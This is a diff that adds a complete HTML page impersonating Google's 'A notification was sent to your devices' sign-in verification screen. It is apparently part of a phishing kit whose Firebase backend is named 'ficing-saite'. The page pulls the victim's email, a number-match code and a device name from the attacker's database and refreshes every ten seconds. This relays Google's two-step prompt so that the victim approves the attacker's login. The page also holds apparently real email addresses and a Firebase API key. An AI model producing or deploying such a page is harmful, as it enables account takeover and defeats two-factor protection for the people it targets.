@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Google Verify</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.6.11/firebase-database-compat.js"></script>
+  <style>
+    body {
+      margin: 0;
+      background: #f2f3f5;
+      font-family: 'Roboto', sans-serif;
+    }
+    .main-container {
+      max-width: 900px;
+      margin: 60px auto;
+      background: white;
+      border-radius: 8px;
+      display: flex;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      padding: 40px;
+      align-items: center;
+      justify-content: space-between;
+    }
+    .left {
+      flex: 1.2;
+    }
+    .left h1 {
+      font-size: 24px;
+      font-weight: 400;
+      margin-bottom: 20px;
+    }
+    .left p {
+      font-size: 14px;
+      color: #444;
+      line-height: 1.5;
+    }
+    .email-dropdown {
+      margin: 18px 0;
+      background: #f1f3f4;
+      padding: 10px 14px;
+      border-radius: 6px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+    }
+    .left a {
+      font-size: 13px;
+      color: #1a73e8;
+      text-decoration: none;
+    }
+    .right {
+      text-align: center;
+      flex: 0.8;
+    }
+    .big-number {
+      font-size: 48px;
+      font-weight: bold;
+      margin-bottom: 14px;
+    }
+    .right p {
+      font-size: 14px;
+      color: #444;
+      line-height: 1.6;
+    }
+    .checkbox-area {
+      margin: 18px 0;
+      text-align: left;
+      font-size: 13px;
+    }
+    footer {
+      margin-top: 60px;
+      text-align: center;
+      font-size: 13px;
+      color: #5f6368;
+    }
+    footer a {
+      margin: 0 10px;
+      color: #5f6368;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="main-container">
+    <div class="left">
+      <img src="https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_92x30dp.png" alt="Google" style="margin-bottom: 20px;">
+      <h1>A notification was sent to the devices signed into your recovery email</h1>
+      <p>Your recovery email <b id="maskedEmail">jih•••••••@gmail.com</b> is signed into one or more of your devices. Google sent a notification to these devices to help you sign in.</p>
+      <div class="email-dropdown" id="fullEmailDropdown">
+        gloriagaynos@gmail.com <span>▼</span>
+      </div>
+      <a href="#">Resend it</a>
+    </div>
+    <div class="right">
+      <div class="big-number" id="codeBox">19</div>
+      <p>Check your <b id="deviceName">OnePlus Nord CE 2</b></p>
+      <p>
+        Google sent a notification to your <span id="deviceName2"><b>OnePlus Nord CE 2</b></span>.
+        <b>Tap Yes</b> on the notification, then tap <span id="codeRepeat">19</span> on your phone to verify it’s you.
+      </p>
+      <div class="checkbox-area">
+        <input type="checkbox" checked /> Don't ask again on this device
+      </div>
+      <a href="#">Try another way</a>
+    </div>
+  </div>
+  <footer>
+    <a href="#">Help</a>
+    <a href="#">Privacy</a>
+    <a href="#">Terms</a>
+  </footer>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyAgpdDasyi53U6UNqrVsxVXyxvzj1pgu-4",
+      authDomain: "ficing-saite.firebaseapp.com",
+      databaseURL: "https://ficing-saite-default-rtdb.firebaseio.com",
+      projectId: "ficing-saite",
+      storageBucket: "ficing-saite.appspot.com",
+      messagingSenderId: "918972094496",
+      appId: "1:918972094496:web:c4495cdf0f6bd3aac48445"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    const userId = localStorage.getItem("userId");
+    function loadVerifyPage() {
+      if (userId) {
+        db.ref("user_messages/" + userId).once("value")
+          .then(snapshot => {
+            const data = snapshot.val();
+            if (data) {
+              if (data.email) {
+                document.getElementById("fullEmailDropdown").innerHTML = `${data.email} <span>▼</span>`;
+                const [name, domain] = data.email.split("@");
+                const masked = name.length <= 3 ? name[0] + "••••@" + domain : name.slice(0, 3) + "••••••@" + domain;
+                document.getElementById("maskedEmail").textContent = masked;
+              }
+              if (data.code) {
+                document.getElementById("codeBox").textContent = data.code;
+                document.getElementById("codeRepeat").textContent = data.code;
+              }
+              if (data.note) {
+                document.getElementById("deviceName").textContent = data.note;
+                document.getElementById("deviceName2").innerHTML = `<b>${data.note}</b>`;
+              }
+            }
+          });
+      }
+    }
+    loadVerifyPage();
+    setTimeout(() => {
+      location.reload();
+    }, 10000);
+  </script>
+</body>
+</html>
